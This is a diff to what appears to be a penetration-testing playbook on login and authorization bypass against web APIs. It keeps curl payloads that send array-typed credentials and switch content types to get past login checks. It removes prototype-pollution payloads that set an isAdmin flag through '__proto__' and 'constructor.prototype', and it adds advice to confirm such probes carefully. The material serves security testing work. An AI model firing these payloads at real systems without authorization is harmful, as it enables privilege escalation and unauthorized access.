@@ -21,15 +21,6 @@ curl -si -X POST <target>/api/login -H 'Content-Type: application/json' \
 curl -si -X POST <target>/api/login -H 'Content-Type: application/json' \
   -d '{"username":["admin"],"password":["anyvalue"]}'
 
-# prototype pollution (Node) — poisons Object.prototype process-wide
-curl -si -X POST <target>/api/settings $AUTH_HEADER -H 'Content-Type: application/json' \
-  -d '{"__proto__":{"isAdmin":true}}'
-curl -si -X POST <target>/api/settings $AUTH_HEADER -H 'Content-Type: application/json' \
-  -d '{"constructor":{"prototype":{"isAdmin":true}}}'
-
-# re-probe admin endpoints immediately after a pollution attempt
-curl -si <target>/api/admin/ $AUTH_HEADER
-
 # content-type switch — body parsed differently per Content-Type
 curl -si -X POST <target>/api/login -H 'Content-Type: application/x-www-form-urlencoded' \
   -d '{"username":"admin","password":"admin"}'
@@ -37,4 +28,7 @@ curl -si -X POST <target>/api/login -H 'Content-Type: application/json' \
   -d 'username=admin&password=admin'
 ```
 
-Prototype pollution is especially worth trying where the app checks a flag that is **never set** in normal operation (`if (user.isAdmin)`), and where a mass-assignment filter already blocked the direct field.
+Do not mix direct authorization fields into an unconfirmed prototype-pollution probe. When a
+Node/JavaScript app combines a nested JSON merge with an absent-own-property authorization check,
+route to `server-side-prototype-pollution.md` and confirm the source with a paired, neutralized
+framework oracle first.
